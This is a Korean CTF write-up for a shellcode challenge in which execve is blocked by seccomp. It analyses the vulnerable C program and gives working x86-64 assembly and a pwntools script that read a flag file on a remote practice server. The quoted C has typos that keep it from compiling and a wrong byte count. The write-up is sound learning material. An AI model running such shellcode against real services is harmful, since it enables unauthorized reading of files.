
>[!note]
>입력한 셸코드를 실행하는 프로그램이 서비스로 등록되어 작동하고 있습니다.
`main` 함수가 아닌 다른 함수들은 execve, execveat 시스템 콜을 사용하지 못하도록 하며, 풀이와 관련이 없는 함수입니다.
flag 파일의 위치와 이름은 `/home/shell_basic/flag_name_is_loooooong`입니다.

### 코드 분석

```c
// comile: gcc -o shell_basic shell_basic.c -lseccomp
// apt install seccomp libseccomp-dev

# include <fcntl.h> // 파일 제어 관련 
# include <seccomp.h> // 보안 관련 시스템콜 필터링
# include <stdio.h> // 표준 입출력
# include <stdlib.h> // 표준 라이브러리 (exit,malloc)
# include <string.h> // 문자열 처리
# include <sys/prctl.h> // 프로세스 제어
# include <unistd.h> // 유닉스 시스템콜들 (read,alarm)
# include <sys/mman.h> // 메모리 매핑
# include <signal.h> // 시그널 처리

void alarm_handler(){
	puts("TIME OUT");
	exit(-1);
}
// puts(): 문자열을 출력, printf와 같지만 자동 줄바꿈 추가
// exit(-1): 프로그램을 에러 코드 -1로 종료, 프로그램을 강제로 끝내는 코드이다. 0은 정상적으로 끝난거고 0이 아닌 숫자는 문제가 있어서 끝난것

void init(){
	setvbuf(stdin,NULL,_IONBF,0);
	setvbuf(stdout,NULL,_IONBF,0);
	signal(SIGNALRM,alarm_handler); // SIGNALRM 신호가 오면 alarm_handler 함수 실행
	alarm(10); // 10초 후에 SIGANLRM 신호 보내
}

void banned_execve(){ // 특정 시스템콜들을 금지하는 보안 필터 설정 (execve와 execveat)
	scmp_filter_ctx ctx;
	ctx=seccomp_init(SCMP_ACT_ALLOW);
	if (ctx==NULL){
		exit(0);
	}
	// seccomp 초기화가 실패하면 ctx가 null이 됨
	// 실패하면 프로그램을 바로 종료
	// 보안 설정이 안되면 위험하니까 아예 실행 안 하겠다는 뜻
	seccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(execve),0);
	seccomp_rule_add(ctx,SCMP_ACT_KILL,SCMP_SYS(execveat),0);

	seccomp_load(ctx);
	// 지금까지 설정한 규칙들을 커널에 실제로 적용용
}

void main(int argc,char *argv[]){
	char *shellcode=mmap(NULL,0x1000,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS,-1,0);
	// NULL: 시작주소를 정하지 않음
	// 0x1000=16진수로 4098 바이트 (4KB)
	// 읽기 가능, 쓰기가능, 실행가능
	void (*sc)();

	init();

	banned_execve();

	printf("shellcode:");
	read(0,shellcode,0x1000);

	sc=(void *)shellocde;
	sc();
}

```

- execve 명령을 사용하는 것이 금지되어 있기 때문에 셸을 실행하는 셸코드가 아닌, 원하는 경로의 파일을 읽어 출력하는 셸코드를 작성하는 것을 목표로 한다. 
- setvbuf() 함수 분석
	- stdin 또는 stdout (어떤 스트림을 설정할지)
	- NULL 버퍼를 자동으로 할당
	- _IONBF (버퍼링 모드)
	- 0 (버퍼 크기, _IONBF에서는 무시됨)
- 버퍼링 모드 종류
	- _IOFBF: 완전 버퍼링, 기본값
	- _IOLBF: 줄 단위 버퍼링
	- _IONBF: 버퍼링 없음
- 스트림은 데이터가 흐르는 통로라고 생각하면 된다.
	- stdin: 사용자가 입력한 데이터를 받음 / 키보드와 연결 / scanf(), getchar(), read() 등 / 키보드에서 데이터를 받아먹음
	- stdout: 프로그램의 결과를 출력 / 모니터 화면과 연결 / printf(), puts(), write() 등 / 화면으로 데이터를 뱉어냄
	- stderr: 에러 메시지 출력

### 익스플로잇
- assembly로 작성하기

```c
int fd=open("/home/shell_basic/flag_name_is_loooooong",O_RDONLY,NULL);
read(fd,buf,0x30);
write(1,buf,0x30);
```
- 문자의 개수: 40개
- 64비트 시스템에서는 8바이트씩 스택에 저장
- 40바이트 % 8바이트는 5번의 push 명령 필요
- null 종료 문자 1개 \n
- 총 41바이트 필요

### 최종 assembly 코드
```assembly
push 0x0                    ;  NULL byte
mov rax, 0x676e6f6f6f6f6f6f ; "oooooong"
push rax
mov rax, 0x6c5f73695f656d61 ; "ame_is_l"
push rax
mov rax, 0x6e5f67616c662f63 ; "c/flag_n"
push rax
mov rax, 0x697361625f6c6c65 ; "ell_basi"
push rax
mov rax, 0x68732f656d6f682f ; "/home/sh"
push rax
mov rdi, rsp    ; rdi = "/home/shell_basic/flag_name_is_loooooong"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/home/shell_basic/flag_name_is_loooooong", RD_ONLY, NULL)

mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)

mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```

- shellcraft 사용하기

```python
from pwn import *

# p = process("./shell_basic")
p = remote("host3.dreamhack.games", 15969)
context.arch = "amd64"

dir = "/home/shell_basic/flag_name_is_loooooong"

shellcode = shellcraft.open(dir)
shellcode += shellcraft.read('rax', 'rsp', 0x30)
shellcode += shellcraft.write(1, 'rsp', 0x30)

p.sendlineafter(b"shellcode: ", asm(shellcode))

p.interactive()
```

- 취약점: 사용자가 보낸 데이터를 검증 없이 바로 실행
- `shellcode = shellcraft.open(dir)` 파일 열기
- `shellcode += shellcraft.read('rax', 'rsp', 0x30)` 파일 읽기
- `shellcode += shellcraft.write(1, 'rsp', 0x30)` 화면 출력
- 서버의 플래그 파일을 읽어서 화면에 출력

- 취약한 서버 프로그램
```c
read(0, shellcode, 0x1000);
sc=(void *)shellcode;
se();
```
- 사용자 입력 받고 입력을 코드로 취급
- 입력 받은 걸 바로 실행 <- 위험

- 셸 실행은 안되지만 파일 읽기는 되니까 직접 파일 읽어서 출력
- pwntools는 복잡한 어셈블리어를 파이썬으로 쉽게 만들어주는 도구
